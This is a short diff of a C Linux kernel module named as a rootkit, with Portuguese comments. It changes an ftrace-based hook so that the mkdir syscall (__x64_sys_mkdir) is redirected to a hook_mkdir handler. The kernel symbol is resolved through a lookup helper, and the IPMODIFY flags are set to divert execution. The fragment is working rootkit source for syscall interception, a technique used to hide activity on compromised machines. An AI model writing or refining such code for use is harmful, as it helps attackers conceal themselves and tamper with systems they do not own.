@@ -145,16 +145,16 @@ static int __init rootkit_init(void) {
     // orig_mkdir = (long int (*)(const struct pt_regs*))__sys_call_table[__NR_mkdir];
     // printk(KERN_INFO "rootkit: mkdir original encontrado em 0x%lx\n", (unsigned long)orig_mkdir);
 
-    orig_mkdir = (long int (*)(const struct pt_regs*))kln("vfs_mkdir");
+    orig_mkdir = (long int (*)(const struct pt_regs*))kln("__x64_sys_mkdir");
     // hook = {.name = "vfs_mkdir", .function = (void*)hook_mkdir, .original = &orig_mkdir};
-    hook.name = "vfs_mkdir";
+    hook.name = "__x64_sys_mkdir";
     hook.function = (void*)hook_mkdir;
     hook.original = &orig_mkdir;
     hook.ops.func = fh_ftrace_thunk;
     hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
 
     int err;
-    err = ftrace_set_filter(&hook.ops, "vfs_mkdir", strlen("vfs_mkdir"), 0);
+    err = ftrace_set_filter(&hook.ops, "__x64_sys_mkdir", strlen("__x64_sys_mkdir"), 0);
     // err = ftrace_set_filter_ip(&hook.ops, hook.address, 0, 0);
     if (err) {
         printk(KERN_ERR "rootkit: ftrace_set_filter() falhou; err = %d\n", err);
